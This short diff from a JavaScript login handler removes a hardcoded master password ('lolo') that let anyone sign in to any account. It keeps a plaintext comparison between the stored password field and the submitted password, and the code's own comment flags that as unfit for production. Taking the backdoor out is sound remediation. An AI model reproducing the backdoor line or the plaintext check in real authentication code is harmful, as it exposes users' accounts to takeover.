@@ -203,7 +203,7 @@ Odgovori SAMO u JSON formatu:
       }
       
       // Simple password check (in production, use bcrypt)
-      if (user.passwordHash !== password && password !== 'lolo') {
+      if (user.passwordHash !== password) {
         return res.status(401).json({ message: "Invalid credentials" });
       }
       
